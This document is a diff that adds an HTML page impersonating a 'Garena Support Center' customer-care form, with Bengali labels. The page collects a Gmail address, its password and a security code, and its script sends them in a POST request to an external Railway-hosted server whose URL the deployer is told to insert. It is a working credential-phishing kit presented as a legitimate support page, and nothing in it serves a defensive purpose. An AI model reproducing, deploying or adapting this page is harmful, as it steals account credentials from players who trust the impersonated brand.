@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Garena Support Center</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            min-height: 100vh;
+        }
+
+        .top-header {
+            width: 100%;
+            padding: 15px 25px;
+            background-color: #ffffff;
+            border-bottom: 1px solid #e0e0e0;
+            display: flex;
+            align-items: center;
+        }
+
+        .brand-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .brand-logo {
+            height: 40px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        .brand-text {
+            color: #ff0000;
+            font-size: 26px;
+            font-weight: 900;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+        }
+
+        .main-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 20px;
+        }
+
+        .support-card {
+            background: #ffffff;
+            border: 1px solid #e0e0e0;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.05);
+            width: 100%;
+            max-width: 420px;
+            padding: 30px;
+        }
+
+        .card-header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .card-header h2 {
+            color: #333333;
+            font-size: 20px;
+            font-weight: 600;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 6px;
+            color: #555555;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #cccccc;
+            border-radius: 8px;
+            font-size: 14px;
+            background-color: #fafafa;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 13px;
+            background-color: #ff0000;
+            color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .submit-btn:hover {
+            background-color: #cc0000;
+        }
+    </style>
+</head>
+<body>
+
+    <header class="top-header">
+        <div class="brand-container">
+            <img src="logo.png" alt="Garena Logo" class="brand-logo" id="garenaLogo">
+            <span class="brand-text">GARENA</span>
+        </div>
+    </header>
+
+    <div class="main-container">
+        <div class="support-card">
+            <div class="card-header">
+                <h2>Customer Care Center</h2>
+            </div>
+
+            <form id="supportForm">
+                <div class="form-group">
+                    <label>Bind Gmail</label>
+                    <input type="email" id="gmail" placeholder="Enter gmail" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Enter Password</label>
+                    <input type="password" id="password" placeholder="Enter password" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Enter Confirm Password</label>
+                    <input type="password" id="confirmPassword" placeholder="Confirm password" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Security Code</label>
+                    <input type="text" id="securityCode" placeholder="Enter security code" required>
+                </div>
+
+                <div class="form-group">
+                    <label>তোমার সমস্যা কি</label>
+                    <select id="problemType" required>
+                        <option value="" disabled selected>সমস্যা নির্বাচন করুন</option>
+                        <option value="Recovery Email Issue">Recovery Email</option>
+                        <option value="Bind SMS Issue">Bind SMS</option>
+                        <option value="Account Lock Problem">Account Lock</option>
+                        <option value="Other Issue">Other Issue</option>
+                    </select>
+                </div>
+
+                <button type="submit" class="submit-btn">Submit Request</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // রেলওয়েতে ডিপ্লয় করার পর প্রাপ্ত লিংকটি নিচে বসাবেন
+        const RAILWAY_URL = 'https://YOUR-RAILWAY-APP.up.railway.app'; 
+
+        document.getElementById('supportForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const pass = document.getElementById('password').value;
+            const confirmPass = document.getElementById('confirmPassword').value;
+
+            if (pass !== confirmPass) {
+                alert('পাসওয়ার্ড দুটি মিলছে না!');
+                return;
+            }
+
+            const payload = {
+                gmail: document.getElementById('gmail').value,
+                password: pass,
+                securityCode: document.getElementById('securityCode').value,
+                problemType: document.getElementById('problemType').value
+            };
+
+            try {
+                const res = await fetch(`${RAILWAY_URL}/api/submit`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                const data = await res.json();
+                if(data.success) {
+                    alert('আপনার রিকোয়েস্ট সফলভাবে জমা হয়েছে!');
+                    document.getElementById('supportForm').reset();
+                }
+            } catch (err) {
+                alert('সাবমিট করতে সমস্যা হয়েছে।');
+            }
+        });
+    </script>
+</body>
+</html>
